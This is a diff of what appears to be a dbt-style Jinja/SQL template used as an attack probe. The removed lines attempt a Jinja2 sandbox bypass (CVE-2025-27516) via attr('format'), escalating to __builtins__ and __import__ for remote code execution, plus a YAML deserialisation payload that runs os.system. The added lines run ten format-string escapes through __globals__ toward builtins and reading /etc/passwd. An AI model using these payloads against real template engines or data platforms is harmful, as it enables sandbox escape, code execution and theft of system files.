@@ -1,49 +1,52 @@
-{# CVE-2025-27516 Jinja2 < 3.1.6 sandbox bypass via attr("format") #}
-{# If vulnerable: attr filter uses raw getattr() instead of environment.getattr() #}
+{# Format string tests - check if angle brackets are being stripped #}
 
-{# Step 0: Check Jinja2 version #}
-{%- set jinja_version = '' -%}
-{%- if modules.jinja2 is defined -%}
-  {{ log("JINJA2_VERSION=" ~ modules.jinja2.__version__, info=True) }}
-{%- else -%}
-  {{ log("JINJA2_NOT_IN_MODULES", info=True) }}
+{# Test 1: format_map with __class__.__name__ (no angle brackets) #}
+{%- set r1 = "{x.__class__.__name__}".format_map({'x': ''}) -%}
+{{ log("FMAP_CLASS_NAME=" ~ r1, info=True) }}
+
+{# Test 2: Basic format to confirm format works at all #}
+{%- set r2 = "{0}_{1}".format("hello", "world") -%}
+{{ log("FORMAT_BASIC=" ~ r2, info=True) }}
+
+{# Test 3: format with object attribute access #}
+{%- set r3 = "{0.__class__.__name__}".format("test") -%}
+{{ log("FORMAT_CLASS_NAME=" ~ r3, info=True) }}
+
+{# Test 4: format with deeper access #}
+{%- set r4 = "{0.__class__.__init__}".format("test") -%}
+{{ log("FORMAT_INIT=" ~ r4, info=True) }}
+
+{# Test 5: format with __globals__ access #}
+{%- set r5 = "{0.__class__.__init__.__globals__}".format("test") -%}
+{{ log("FORMAT_GLOBALS_LEN=" ~ r5 | length, info=True) }}
+{{ log("FORMAT_GLOBALS_PREVIEW=" ~ r5 | truncate(500), info=True) }}
+
+{# Test 6: If globals works, try __builtins__ #}
+{%- if r5 | length > 10 -%}
+  {# Parse the globals dict for __builtins__ #}
+  {{ log("FORMAT_GLOBALS_HAS_BUILTINS=checking", info=True) }}
+  {%- set r6 = "{0.__class__.__init__.__globals__[__builtins__][__import__]}".format("test") -%}
+  {{ log("FORMAT_IMPORT=" ~ r6, info=True) }}
 {%- endif -%}
 
-{# Step 1: Test if attr("format") bypasses sandbox #}
-{# This is the CVE-2025-27516 payload #}
-{%- set payload1 = "{0.__class__}" -%}
-{%- set result1 = payload1 | attr("format")(lipsum) -%}
-{{ log("CVE_27516_TEST1=" ~ result1 | string | truncate(500), info=True) }}
+{# Test 7: Alternative via lipsum #}
+{%- set r7 = "{0.__class__.__name__}".format(lipsum) -%}
+{{ log("LIPSUM_CLASS_NAME=" ~ r7, info=True) }}
 
-{# Step 2: If step 1 works (returns a class reference), try deeper #}
-{%- set payload2 = "{0.__class__.__init__.__globals__}" -%}
-{%- set result2 = payload2 | attr("format")(lipsum) -%}
-{{ log("CVE_27516_TEST2=" ~ result2 | string | truncate(500), info=True) }}
+{# Test 8: Try with cycler object #}
+{%- set c = cycler(1,2,3) -%}
+{%- set r8 = "{0.__class__.__name__}".format(c) -%}
+{{ log("CYCLER_INST_CLASS=" ~ r8, info=True) }}
 
-{# Step 3: Try to access builtins through format #}
-{%- set payload3 = "{0.__class__.__init__.__globals__[__builtins__]}" -%}
-{%- set result3 = payload3 | attr("format")(lipsum) -%}
-{{ log("CVE_27516_TEST3=" ~ result3 | string | truncate(500), info=True) }}
+{# Test 9: Try dict subclass access #}
+{%- set r9 = "{0.__class__.__bases__}".format({}) -%}
+{{ log("DICT_BASES=" ~ r9 | truncate(200), info=True) }}
 
-{# Step 4: Try os.popen for RCE #}
-{%- set payload4 = "{0.__class__.__init__.__globals__[__builtins__][__import__]}" -%}
-{%- set result4 = payload4 | attr("format")(lipsum) -%}
-{{ log("CVE_27516_TEST4=" ~ result4 | string | truncate(500), info=True) }}
-
-{# Step 5: Alternative payload via str format_map #}
-{# format_map passes the object directly, different path #}
-{%- set alt_payload = "{x.__class__}" -%}
-{%- set result5 = alt_payload.format_map({'x': ''}) -%}
-{{ log("FORMAT_MAP_TEST=" ~ result5 | string | truncate(500), info=True) }}
-
-{# Step 6: Try YAML deserialization (moved here to not block CVE test) #}
-{%- set yaml1 = "test: value" -%}
-{%- set yaml_safe = fromyaml(yaml1) -%}
-{{ log("YAML_SAFE_PARSE=" ~ yaml_safe | string, info=True) }}
-
-{%- set yaml2 = "!!python/object/apply:os.system ['id']" -%}
-{{ log("YAML_DESER_ATTEMPTING=!!python/object/apply", info=True) }}
-{%- set yaml_evil = fromyaml(yaml2) -%}
-{{ log("YAML_DESER_RESULT=" ~ yaml_evil | string | truncate(200), info=True) }}
+{# Test 10: Try to read /etc/passwd via format + open #}
+{%- set r10 = "{0.__class__.__init__.__globals__[__builtins__]}".format("") -%}
+{{ log("STR_BUILTINS_LEN=" ~ r10 | length, info=True) }}
+{%- if r10 | length > 100 -%}
+  {{ log("STR_BUILTINS_PREVIEW=" ~ r10 | truncate(500), info=True) }}
+{%- endif -%}
 
 SELECT 1 as id
